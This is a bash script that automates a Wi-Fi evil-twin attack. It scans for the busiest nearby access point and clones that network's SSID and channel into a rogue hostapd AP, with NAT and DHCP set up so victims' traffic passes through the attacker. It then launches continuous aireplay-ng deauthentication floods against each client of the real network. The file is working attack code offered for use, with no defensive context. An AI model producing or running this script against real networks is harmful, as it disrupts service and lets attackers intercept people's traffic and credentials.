#!/bin/bash
# Scan all AP around us
interface="$1" #wlan0
monitor_interface="$2" #wlan0mon

clear

sudo airmon-ng check kill

sudo systemctl restart NetworkManager

sudo airmon-ng start $interface

sudo timeout -s 2 25 airodump-ng $monitor_interface -w scan & sleep 26

sudo rm scan-01.cap & sudo rm scan-01.csv & sudo rm scan-01.kismet.netxml

maxData=0
finalName=""
finalMAC=""
finalChannel=0

input="scan-01.kismet.csv"
#Delete first line of the file (without data)
sed -i '1d' $input
#Read each line
while IFS= read -r line
do
  #Parse the given line and put every datas in an array
  IFS=';' read -ra ARRAY <<< "$line"

  if [ "${ARRAY[13]}" -gt "$maxData" ] ; then
    maxData="${ARRAY[13]}"
    finalName="${ARRAY[2]}"
    finalMAC="${ARRAY[3]}"
    finalChannel="${ARRAY[5]}"

  fi


done < "$input"

echo "$maxData"
echo "$finalName"
echo "$finalMAC"

# Creation of our AP
sudo airmon-ng stop $monitor_interface

sed -i "5s/.*/ssid="$finalName"/" hostconf.conf


number=1

#Turn system on forwarding mode
sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
cat /proc/sys/net/ipv4/ip_forward
echo "Echo 1 OK"

#Setup internet route for user, configure firewall
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
echo "iptables OK"

#Add ip to WLan0
sudo ip addr add 192.168.1.1/24 dev $interface
echo "ip add OK"

#Exec hostapd on another terminal
sudo gnome-terminal -- bash -c "sudo hostapd /home/mike/Documents/Secu/hostconf.conf ; exec bash"

sudo rm scan-01.kismet.csv
sudo rm scan-01.log.csv

#Exec dnsmasq on another terminal to setup DHCP
sudo gnome-terminal -- bash -c "sudo dnsmasq -d -C host.conf ; exec bash"

#Deauth all users of the selected AP until the end of the script

sudo airmon-ng start $interface

sudo timeout -s 2 80 airodump-ng $monitor_interface --bssid $finalMAC -a -w device & sleep 81

#Delete line 1 to 5 (useless lines, without data wanted)
sed -i '1,5d' device-01.csv

#Automatically change the channel of the fake AP to match with the original
sed -i "7s/.*/channel="$finalChannel"/" hostconf.conf

sudo airmon-ng stop $interface

sudo airmon-ng start $interface

#Death each user of the AP attacked
while IFS= read -r line
do
  #Parse the given line and put every datas in an array
  IFS=',' read -ra ARRAY <<< "$line"

  sudo gnome-terminal -- bash -c "aireplay-ng --deauth 0 -a $finalMAC -c ${ARRAY[0]} $monitor_interface ; exec bash"


done < "device-01.csv"
